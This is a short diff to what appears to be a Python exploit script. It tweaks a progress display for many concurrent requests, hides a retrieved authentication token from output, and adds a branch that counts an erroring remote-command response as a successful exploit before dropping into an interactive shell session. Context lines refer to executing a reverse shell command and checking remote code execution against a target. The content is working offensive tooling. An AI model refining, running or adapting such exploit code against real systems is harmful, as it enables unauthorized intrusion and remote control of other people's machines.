@@ -104,7 +104,7 @@ def monitor_threads(request_amount: int):
 
             status = (
                 f"[Progress: {completed:,}/{request_amount:,}] "
-                f"[Active/Pending: {request_amount - completed:,}] "
+                f"[Remaining: {request_amount - completed:,}] "
                 f"[Failed: {failures:,}] "
                 f"[Latency: {latency_avg:.1f}/{latency_max:.1f} ms] "
                 f"[Init T/F/?: {init_true}/{init_false}/{init_unknown}]"
@@ -312,8 +312,8 @@ def main(args):
     if token == "":
         print(f"[-] Exploit failed. ({auth.status_code})")
         return
-
-    print(f"[+] Token retrieved: {token}")
+    
+    print("[+] Token retrieved.")
 
     print("[*] Executing reverse shell command...")
     data = {
@@ -343,6 +343,11 @@ def main(args):
     elif rce.status_code != 200:
         print(f"[-] RCE failed. [{rce.status_code}]")
         return
+    elif rce_json.get("is_error") == True:
+        # The command did run but the command has failed. This means RCE is still working.
+        print("[!] RCE confirmation code returned an error.")
+        print("[+] Exploit success.")
+        interative(token, target, timeout)
 
 if __name__ == "__main__":
     parser = ArgumentParser(
